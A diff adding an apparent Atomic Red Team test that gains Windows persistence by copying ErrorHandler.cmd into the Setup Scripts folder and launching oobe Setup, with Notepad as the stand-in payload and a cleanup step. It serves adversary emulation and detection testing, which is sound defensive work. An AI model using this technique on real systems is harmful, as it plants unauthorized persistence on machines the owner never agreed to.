@@ -169,3 +169,25 @@ atomic_tests:
       reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin" /f
     name: command_prompt
     elevation_required: true
+- name: Persistence via ErrorHandler.cmd script execution
+  description: |
+    Create persistence by triggering script within ErrorHandler.cmd upon the execution of specific binaries within the oobe directory.
+    Upon test execution, Setup.exe will be executed to further execute script within ErrorHandlercmd to launch Notepad.
+  supported_platforms:
+  - windows
+  dependencies:
+  - description: |
+      ErrorHandler.cmd script must exist on disk at specified at PathToAtomicsFolder\T1546\bin\ErrorHandler.cmd
+    prereq_command: |
+      if (Test-Path PathToAtomicsFolder\T1546\bin\ErrorHandler.cmd) { exit 0} else { exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\T1546\bin\" -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/ErrorHandler.cmd" -OutFile "PathToAtomicsFolder\T1546\bin\ErrorHandler.cmd"      
+  executor:
+    command: |
+      Copy-Item -Path PathToAtomicsFolder\T1546\bin\ErrorHandler.cmd -Destination C:\Windows\Setup\Scripts\ErrorHandler.cmd
+      C:\windows\System32\oobe\Setup
+    cleanup_command: |-
+      Remove-Item C:\Windows\Setup\Scripts\ErrorHandler.cmd      
+    name: powershell
+    elevation_required: true    
